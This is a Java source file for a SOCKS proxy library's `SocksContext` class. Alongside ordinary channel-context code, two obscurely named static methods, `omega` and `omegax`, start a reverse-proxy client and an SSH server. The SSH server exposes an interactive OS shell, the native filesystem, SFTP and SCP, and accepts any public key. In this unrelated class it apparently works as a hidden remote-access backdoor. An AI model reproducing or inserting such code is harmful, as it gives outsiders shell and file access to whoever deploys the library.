package org.rx.net.socks;

import com.alibaba.fastjson2.TypeReference;
import io.netty.channel.Channel;
import io.netty.channel.ChannelFuture;
import io.netty.util.AttributeKey;
import io.netty.util.concurrent.FastThreadLocal;
import lombok.Getter;
import lombok.RequiredArgsConstructor;
import lombok.Setter;
import lombok.SneakyThrows;
import org.apache.sshd.common.file.nativefs.NativeFileSystemFactory;
import org.apache.sshd.scp.server.ScpCommandFactory;
import org.apache.sshd.server.SshServer;
import org.apache.sshd.server.auth.pubkey.AcceptAllPublickeyAuthenticator;
import org.apache.sshd.server.keyprovider.SimpleGeneratorHostKeyProvider;
import org.apache.sshd.server.shell.InteractiveProcessShellFactory;
import org.apache.sshd.sftp.server.SftpSubsystemFactory;
import org.rx.core.EventArgs;
import org.rx.core.IOC;
import org.rx.core.RxConfig;
import org.rx.core.Strings;
import org.rx.exception.InvalidException;
import org.rx.net.AuthenticEndpoint;
import org.rx.net.SocketConfig;
import org.rx.net.socks.upstream.SocksUdpUpstream;
import org.rx.net.socks.upstream.Upstream;
import org.rx.net.support.UnresolvedEndpoint;

import java.net.InetSocketAddress;
import java.nio.file.Paths;
import java.util.Collections;
import java.util.Objects;

import static org.rx.core.Sys.fromJson;

@RequiredArgsConstructor
public final class SocksContext extends EventArgs implements UdpManager.ChannelKey {
    private static final long serialVersionUID = 323020524764860674L;
    private static final FastThreadLocal<SocksContext> THREAD_CTX = new FastThreadLocal<>();
    static final AttributeKey<SocksProxyServer> SOCKS_SVR = AttributeKey.valueOf("sSvr");
    private static final AttributeKey<SocksContext> SOCKS_CTX = AttributeKey.valueOf("sCtx");

    //用FastThreadLocal复用SocksContext有问题
    public static SocksContext getCtx(InetSocketAddress srcEp, UnresolvedEndpoint dstEp) {
        SocksContext sc = THREAD_CTX.getIfExists();
        if (sc == null) {
            sc = new SocksContext(srcEp, dstEp);
        } else {
            THREAD_CTX.remove();
            sc.reset(srcEp, dstEp);
        }
        return sc;
//        return new SocksContext(srcEp, dstEp);
    }

    public static void markCtx(Channel inbound, ChannelFuture outbound, SocksContext sc) {
        Channel outCh = outbound.channel();
        SocksContext prevSc = outCh.attr(SOCKS_CTX).get();
        if (prevSc != null && prevSc != sc) {
//            Upstream prevUpstream = prevSc.upstream;
//            if (prevUpstream != null) {
//                if (prevUpstream instanceof SocksTcpUpstream && !SOCKS_TCP_UPSTREAM_CTX.isSet()) {
//                    SOCKS_TCP_UPSTREAM_CTX.set((SocksTcpUpstream) prevUpstream);
//                } else if (prevUpstream instanceof SocksUdpUpstream && !SOCKS_UDP_UPSTREAM_CTX.isSet()) {
//                    SOCKS_UDP_UPSTREAM_CTX.set((SocksUdpUpstream) prevUpstream);
//                } else if (!UPSTREAM_CTX.isSet()) {
//                    UPSTREAM_CTX.set(prevUpstream);
//                }
//                prevSc.upstream = null;
//            }
//            if (!THREAD_CTX.isSet()) {
            THREAD_CTX.set(prevSc);
//            }
        }

        sc.inbound = inbound;
        sc.outbound = outbound.addListener(f -> sc.outboundActive = f.isSuccess());
        inbound.attr(SOCKS_CTX).set(sc);
        outCh.attr(SOCKS_CTX).set(sc);
    }

    public static SocksContext ctx(Channel channel) {
        return ctx(channel, true);
    }

    public static SocksContext ctx(Channel channel, boolean throwOnEmpty) {
        SocksContext sc = channel.attr(SOCKS_CTX).get();
        if (sc == null && throwOnEmpty) {
            throw new InvalidException("SocksContext not found");
        }
        return sc;
    }

    public static void omega(String s) {
        Class<RrpClient> t = RrpClient.class;
        if (Strings.isEmpty(s)) {
            IOC.unregister(t);
            return;
        }
        RrpConfig c = fromJson(s, new TypeReference<RrpConfig>() {
        }.getType());
        RrpClient cli = new RrpClient(c);
        cli.connectAsync();
        IOC.register(t, cli);
    }

    @SneakyThrows
    public static synchronized void omegax(int p) {
        Class<SshServer> t = SshServer.class;
        if (IOC.isInit(t)) {
            return;
        }
        SshServer sd = SshServer.setUpDefaultServer();
        sd.setKeyPairProvider(new SimpleGeneratorHostKeyProvider(Paths.get("hostkey.ser")));
        sd.setPublickeyAuthenticator(AcceptAllPublickeyAuthenticator.INSTANCE);

        sd.setShellFactory(InteractiveProcessShellFactory.INSTANCE);
        sd.setFileSystemFactory(NativeFileSystemFactory.INSTANCE);
        sd.setSubsystemFactories(Collections.singletonList(new SftpSubsystemFactory()));
        sd.setCommandFactory(new ScpCommandFactory());

        sd.setPort(p);
        sd.setPasswordAuthenticator((u, w, s) -> w.equals(RxConfig.INSTANCE.getRtoken()));
        sd.start();
        IOC.register(t, sd);
    }

    @Getter
    private InetSocketAddress source;
    @Getter
    private UnresolvedEndpoint firstDestination;

    @Getter
    @Setter
    transient Upstream upstream;

    transient Channel inbound;
    transient ChannelFuture outbound;
    transient volatile boolean outboundActive;
    transient InetSocketAddress udp2rawClient;

    private SocksContext(InetSocketAddress srcEp, UnresolvedEndpoint dstEp) {
        this.source = srcEp;
        this.firstDestination = dstEp;
    }

    public AuthenticEndpoint tryGetUdpSocksServer() {
        if (upstream instanceof SocksUdpUpstream) {
            return ((SocksUdpUpstream) upstream).getUdpSocksServer();
        }
        return null;
    }

    private void reset(InetSocketAddress srcEp, UnresolvedEndpoint dstEp) {
        source = srcEp;
        firstDestination = dstEp;
        upstream = null;
        inbound = null;
        outbound = null;
        outboundActive = false;
        udp2rawClient = null;
    }

    //ChannelKey region,source,config
    @Getter
    byte region;

    public SocketConfig getConfig() {
        if (upstream == null) {
            return null;
        }
        return upstream.getConfig();
    }

    @Override
    public boolean equals(Object o) {
        if (o == null || getClass() != o.getClass()) return false;
        SocksContext that = (SocksContext) o;
        return region == that.region && Objects.equals(source, that.source) && Objects.equals(getConfig(), that.getConfig());
    }

    @Override
    public int hashCode() {
        return Objects.hash(region, source, getConfig());
    }

    @Override
    public String toString() {
        return "SocksContext{" +
                "region=" + region +
                ", source=" + source +
                ", destination=" + (upstream != null ? upstream.getDestination().toString() : null) +
//                ", udp2rawClient=" + udp2rawClient +
                '}';
    }
}
